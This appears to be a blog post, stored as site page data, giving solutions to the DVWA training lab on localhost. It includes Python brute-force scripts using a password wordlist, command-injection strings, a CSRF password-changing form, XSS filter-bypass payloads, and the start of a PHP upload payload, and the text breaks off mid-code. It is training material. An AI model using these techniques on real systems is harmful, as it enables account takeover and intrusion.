{"componentChunkName":"component---src-templates-post-template-js","path":"/blog/dvwa-solutions/","result":{"data":{"markdownRemark":{"excerpt":"Brute Force Low and Medium In the  level we find that the password is being shared in the URL of the website, like, http://127.0.0.1/dvwa/vulnerabilities/brute…","html":"<h1>Brute Force</h1>\n<h2>Low and Medium</h2>\n<p>In the <code class=\"language-text\">Brute Force Low</code> level we find that the password is being shared in the URL of the website, like,</p>\n<p><a href=\"http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&#x26;password=123456&#x26;Login=Login#\">http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&#x26;password=123456&#x26;Login=Login#</a></p>\n<p>We can brute force the different URLs using this code and the rockyou.txt wordlist.</p>\n<p>If the password is wrong, I will get,\n<code class=\"language-text\">Username and/or password incorrect.</code>\non the screen.</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_url</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"http://127.0.0.1/dvwa/vulnerabilities/brute/?username=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>username<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;password=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>password<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;Login=Login#\"</span></span>\n\nusername <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter Username : \"</span><span class=\"token punctuation\">)</span>\n\nCOOKIES <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"PHPSESSID\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"pf9kipp16vs54366mr21smurse\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"security\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"high\"</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rockyou.txt\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n        p <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        url <span class=\"token operator\">=</span> get_url<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\n        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>cookies<span class=\"token operator\">=</span>COOKIES<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Checking \"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">if</span> <span class=\"token string\">'incorrect'</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"Found password for </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>username<span class=\"token punctuation\">}</span></span><span class=\"token string\"> = </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>p<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">break</span></code></pre></div>\n<h2>High</h2>\n<p>Use the following code for High level</p>\n<div class=\"gatsby-highlight\" data-language=\"py\"><pre class=\"language-py\"><code class=\"language-py\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">def</span> <span class=\"token function\">get_url</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>password<span class=\"token punctuation\">,</span>token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">return</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"http://127.0.0.1/dvwa/vulnerabilities/brute/?username=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>username<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;password=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>password<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;user_token=</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>token<span class=\"token punctuation\">}</span></span><span class=\"token string\">&amp;Login=submit#\"</span></span>\nusername <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Enter Username : \"</span><span class=\"token punctuation\">)</span>\nCOOKIES <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"PHPSESSID\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"km7qua1eth40r643ggc8ll6cbp\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"security\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">\"high\"</span>\n<span class=\"token punctuation\">}</span>\npasswords <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"rockyou.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>Session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"http://127.0.0.1/dvwa/vulnerabilities/brute/index.php\"</span><span class=\"token punctuation\">,</span>cookies<span class=\"token operator\">=</span>COOKIES<span class=\"token punctuation\">)</span>\n    body <span class=\"token operator\">=</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\" \"</span><span class=\"token punctuation\">)</span>\n    token <span class=\"token operator\">=</span> body<span class=\"token punctuation\">[</span>body<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"name='user_token'\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"=\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span>\n\n    p <span class=\"token operator\">=</span> passwords<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>strip<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    url <span class=\"token operator\">=</span> get_url<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>token<span class=\"token punctuation\">)</span>\n    r <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span>cookies<span class=\"token operator\">=</span>COOKIES<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token string\">'incorrect'</span> <span class=\"token keyword\">in</span> r<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Trying \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Found \"</span><span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">break</span></code></pre></div>\n<h1>Command Injection</h1>\n<p>Trying to inject a windows command - <code class=\"language-text\">dir</code></p>\n<h2>Low</h2>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'ip'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Determine OS and execute the ping command.</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span> <span class=\"token function\">php_uname</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'s'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'Windows NT'</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">// Windows</span>\n        <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token function\">shell_exec</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'ping  '</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span></code></pre></div>\n<p>It is directly executing the <code class=\"language-text\">$target</code> without any input validation.\n<strong>Attack :</strong> 127.0.0.1 &#x26;&#x26; dir</p>\n<h2>Medium</h2>\n<p>Some level of input validation is performed this time,</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\">// Set blacklist</span>\n    <span class=\"token variable\">$substitutions</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string single-quoted-string\">'&amp;&amp;'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">';'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Remove any of the charactars in the array (blacklist).</span>\n    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token function\">array_keys</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$substitutions</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$substitutions</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>But, notice that only <code class=\"language-text\">&amp;&amp;</code> is being replaced, we can use <code class=\"language-text\">&amp;</code>.\n<strong>Attack :</strong> 127.0.0.1 &#x26; dir</p>\n<h2>High</h2>\n<p>More Filtering has been done,</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span> <span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'Submit'</span> <span class=\"token punctuation\">]</span>  <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token comment\">// Get input</span>\n    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token function\">trim</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_REQUEST</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'ip'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Set blacklist</span>\n    <span class=\"token variable\">$substitutions</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span>\n        <span class=\"token string single-quoted-string\">'&amp;'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">';'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'| '</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'-'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'$'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'('</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">')'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'`'</span>  <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n        <span class=\"token string single-quoted-string\">'||'</span> <span class=\"token operator\">=></span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Remove any of the characters in the array (blacklist).</span>\n    <span class=\"token variable\">$target</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token function\">array_keys</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$substitutions</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$substitutions</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$target</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>The substitutions only match <code class=\"language-text\">| </code> and not <code class=\"language-text\">|</code>. Hence, there is a loophole in the validation.\nThe pipe symbol (|) is used for output redirection, and that is why you want see the output for the ping command.\n<strong>Attack :</strong> 127.0.0.1|dir (No Spaces)</p>\n<h1>CSRF</h1>\n<h2>Low</h2>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>http://127.0.0.1/dvwa/vulnerabilities/csrf/?<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">method</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>GET<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h1</span><span class=\"token punctuation\">></span></span>Click Me<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h1</span><span class=\"token punctuation\">></span></span>\n <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">AUTOCOMPLETE</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>off<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_new<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hacked<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hidden<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">AUTOCOMPLETE</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>off<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>password_conf<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>hacked<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>input</span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">value</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Change<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>form</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>The above website is a phishing website created by the attacker, it sends a request to the link,\n”<a href=\"http://127.0.0.1/dvwa/vulnerabilities/csrf/\">http://127.0.0.1/dvwa/vulnerabilities/csrf/</a>?” with the new password in the parameters of the link. It is hence used to attack the CSRF vulnerability, since, the website doesn’t check for the source of the request.</p>\n<hr>\n<h1>XSS DOM</h1>\n<h2>Low</h2>\n<p><strong>Attack :</strong>  <code class=\"language-text\">&lt;script>alert(\"hacked\")&lt;/script></code></p>\n<h2>Medium</h2>\n<div class=\"gatsby-highlight\" data-language=\"html\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>select</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>default<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>\n\t\t\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span><span class=\"token punctuation\">></span></span><span class=\"token script\"><span class=\"token language-javascript\">\n\t\t\t\t\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"default=\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t\t\t\t\t\t<span class=\"token keyword\">var</span> lang <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span>location<span class=\"token punctuation\">.</span>href<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"default=\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='\"</span> <span class=\"token operator\">+</span> lang <span class=\"token operator\">+</span> <span class=\"token string\">\"'>\"</span> <span class=\"token operator\">+</span> <span class=\"token function\">decodeURI</span><span class=\"token punctuation\">(</span>lang<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"&lt;/option>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='' disabled='disabled'>----&lt;/option>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\t<span class=\"token punctuation\">}</span>\n\t\t\t\t\t    \n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='English'>English&lt;/option>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='French'>French&lt;/option>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='Spanish'>Spanish&lt;/option>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t\tdocument<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;option value='German'>German&lt;/option>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t\t\t</span></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span>\n\t\t\t<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>select</span><span class=\"token punctuation\">></span></span></code></pre></div>\n<p>We have to break out of the <code class=\"language-text\">&lt;select></code> tag, and for that we have to, use the following command.\nOur input is <code class=\"language-text\">lang</code>\t, from there,\n<strong>Attack :</strong><code class=\"language-text\">>&lt;/option>&lt;/script>&lt;/select>&lt;img src=x onerror=alert(\"hacked\")></code></p>\n<h2>High</h2>\n<p>The programmer has set it in such a way that, any other input we give other than the four languages will be defaulted to English.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\">// Is there any input?</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span> <span class=\"token function\">array_key_exists</span><span class=\"token punctuation\">(</span> <span class=\"token string double-quoted-string\">\"default\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">is_null</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'default'</span> <span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\"># White list the allowable languages</span>\n    <span class=\"token keyword\">switch</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'default'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"French\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"English\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"German\"</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">case</span> <span class=\"token string double-quoted-string\">\"Spanish\"</span><span class=\"token punctuation\">:</span>\n            <span class=\"token comment\"># ok</span>\n            <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">default</span><span class=\"token punctuation\">:</span>\n            <span class=\"token function\">header</span> <span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"location: ?default=English\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">exit</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">></span>\t</code></pre></div>\n<p>We should avoid sending the payload to the server, for blacklisting, so, we use the <code class=\"language-text\">#</code>\n<strong>Attack :</strong> English#<script>alert(“hacked”)</script></p>\n<h1>XSS REFLECTED</h1>\n<h2>Low</h2>\n<p><strong>Attack :</strong>  <code class=\"language-text\">&lt;script>alert(\"hacked\")&lt;/script></code></p>\n<h2>Medium</h2>\n<p>Some level of filtering has been done this time,</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;script>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span> <span class=\"token string single-quoted-string\">'name'</span> <span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>They have only replaced lowercase <code class=\"language-text\">&lt;script></code>, which means, <code class=\"language-text\">&lt;SCRIPT></code> will work!\n<strong>Attack :</strong>  <code class=\"language-text\">&lt;SCRIPT>alert(\"hacked\")&lt;/SCRIPT></code></p>\n<h2>High</h2>\n<p>Only script tags are being targetted by this programmer, use an img tag instead.\n<strong>Attack :</strong> <code class=\"language-text\">&lt;img src=x onerror=alert(\"hacked\")></code></p>\n<h1>XSS STORAGE</h1>\n<h2>Low</h2>\n<p><strong>Attack :</strong>  <code class=\"language-text\">&lt;script>alert(\"hacked\")&lt;/sript></code> (in Message)</p>\n<h2>Medium</h2>\n<p>Some level of filtering has been done in both input blocks, but the name tag has a weaker level of filtering.</p>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token comment\">// Sanitize message input</span>\n    <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">strip_tags</span><span class=\"token punctuation\">(</span> <span class=\"token function\">addslashes</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$message</span> <span class=\"token operator\">=</span> <span class=\"token function\">htmlspecialchars</span><span class=\"token punctuation\">(</span> <span class=\"token variable\">$message</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// Sanitize name input</span>\n    <span class=\"token variable\">$name</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'&lt;script>'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$name</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<p>The strip_tags function is strong and removes all html, php tags. We can target the weaker <code class=\"language-text\">name</code> input field, but, the problem is the <code class=\"language-text\">name</code> field takes only 10 characters. To increase this number,</p>\n<ul>\n<li>Ctrl + Shift + i</li>\n<li>Find the input tag of the <code class=\"language-text\">name</code> field in the console,</li>\n<li>Note, that it has a maxlength value set to 10, increase it to 50.</li>\n<li>Attack the <code class=\"language-text\">name</code> field.</li>\n</ul>\n<p><strong>Attack :</strong> <code class=\"language-text\">&lt;SCRIPT>alert(\"hacked\")&lt;/SCRIPT></code></p>\n<h2>High</h2>\n<p>It is the same case as medium, but this time, there is too much focus on the script tag, so try img tags.\n<strong>Attack :</strong> <code class=\"language-text\">&lt;img src=x onerror=alert(\"hacked\")></code> in Name</p>\n<h1>File Upload</h1>\n<h2>Low</h2>\n<ul>\n<li>Create the following php file</li>\n<li>Upload it</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"php\"><pre class=\"language-php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token function\">getenv</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"PATH\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token delimiter 